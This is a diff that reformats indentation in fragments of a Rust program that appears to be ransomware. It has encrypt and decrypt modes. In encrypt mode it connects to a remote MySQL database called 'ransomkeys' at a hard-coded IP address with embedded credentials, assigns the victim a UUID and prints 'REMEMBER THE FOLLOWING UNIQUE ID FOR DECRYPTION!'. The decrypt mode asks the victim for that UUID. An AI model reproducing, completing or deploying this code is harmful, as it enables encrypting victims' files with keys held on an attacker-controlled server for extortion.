@@ -62,9 +62,9 @@ fn main() -> Result<(), Box<dyn Error>> {
     }
     let path = &args[2].trim();
     if &args[1].trim() == &"encrypt" {
-		let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
-    	let pool = Arc::new(Pool::new(url).unwrap());
-    	let mut conn = pool.get_conn().unwrap();
+        let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
+        let pool = Arc::new(Pool::new(url).unwrap());
+        let mut conn = pool.get_conn().unwrap();
         println!("REMEMBER THE FOLLOWING UNIQUE ID FOR DECRYPTION!");
         let assigned_uuid = Uuid::new_v4();
         let newest_string = assigned_uuid.to_string().replace("-", "").replace(" ", "");
@@ -86,12 +86,12 @@ fn main() -> Result<(), Box<dyn Error>> {
                 println!("{}", enc64);
             }
         }
-		
+
         if &args[1].trim() == &"decrypt" {
-			let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
-    		let pool = Arc::new(Pool::new(url).unwrap());
-    		let mut conn = pool.get_conn().unwrap();
-			println!("Decrypt function called");
+            let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
+            let pool = Arc::new(Pool::new(url).unwrap());
+            let mut conn = pool.get_conn().unwrap();
+            println!("Decrypt function called");
             let mut randomuuid = String::new();
             println!("Please enter your UUID for decryption: ");
             std::io::stdin().read_line(&mut randomuuid).unwrap();
